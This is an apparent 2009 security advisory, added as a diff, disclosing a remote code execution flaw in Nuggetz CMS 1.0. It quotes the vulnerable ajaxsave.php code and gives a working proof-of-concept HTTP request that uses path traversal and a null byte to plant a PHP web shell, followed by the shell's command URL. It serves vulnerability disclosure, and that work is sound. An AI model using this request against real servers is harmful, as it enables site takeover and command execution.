@@ -1,0 +1,90 @@
+#######################################################################
+	Remote Code Execution in Nuggetz CMS 1.0
+
+	Name			Remote Code Execution in Nuggetz CMS
+	Systems Affected	Nuggetz CMS 1.0
+	site			http://www.nuggetz.co.uk/
+	Author			Amol Naik (amolnaik4[at]gmail.com)
+	Date			10/12/2009
+#######################################################################
+
+
+############
+ OVERVIEW
+############
+
+Nuggetz CMS 1.0 is vulnerable to Remote Code Execution.
+
+######################
+ Technical Details
+######################
+
+Vulnerable file: ajaxsave.php
+Vulnerable Code:
+
+<?php
+	$save = str_replace('\"','"',$_POST['pagevalue']);
+
+	$nugget = $_GET['nugget'];
+
+	$fhandle = fopen("../data/$nugget.nuggetz",'w');
+	// Write some data
+	fwrite($fhandle,$save);
+	fclose($fhandle);
+	print $save;
+?>
+
+This file is used to save any changes done in nugget. The parameter 'nugget' is used to call the file 
+for ex. support.nugget, which is at /web_dir/data/. The changed values are written back to the respective 
+nugget. The parameters 'pagevalue' and 'nugget' are not properly sanitized. It is possible to create/edit 
+files in the web server which leads to creating a new file with php command shell (RCE).
+
+######
+ PoC
+######
+
+The following request creates shell.php at /nuggetz/
+
+POST /nuggetz/nuggetz/admin/ajaxsave.php?nugget=../../shell.php%00 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Cookie: PHPSESSID=4m2iiqdt0q38cna2iemtfel7p3
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+
+pagevalue=<?php passthru($_GET['cmd']); ?>
+
+
+Shell Access:
+http://localhost/nuggetz/shell.php?cmd=dir
+
+#############
+ WorkAround
+#############
+
+Upgrade to Nuggetz 1.0.1
+Download:
+http://www.nuggetz.co.uk/nuggetz_v1.0.1.zip
+
+
+############
+ Reference
+############
+
+http://www.nuggetz.co.uk/versionhistory.htm
+
+
+############
+ TimeLine
+############
+
+Bug discovered 			: 09/12/2009
+Informed Vendor			: 10/12/2009 
+Vendor released new version	: 10/12/2009
+Public Disclosure		: 10/12/2009
